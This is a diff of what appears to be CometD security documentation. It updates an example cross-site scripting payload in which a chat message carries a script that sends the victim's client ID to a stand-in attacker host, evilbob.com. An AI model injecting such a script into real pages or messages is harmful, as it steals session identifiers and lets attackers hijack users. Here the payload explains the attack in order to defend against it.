@@ -36,9 +36,9 @@ Bob sends an evil chat message text to Alice where the text is the following:
 [source,html]
 ----
 <script type="text/javascript">
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://evilbob.com?stolen=" + $.cometd.getClientId());
-xhr.send();
+  const xhr = new XMLHttpRequest();
+  xhr.open("GET", "https://evilbob.com?stolen=" + cometd.getClientId());
+  xhr.send();
 </script>
 ----
 
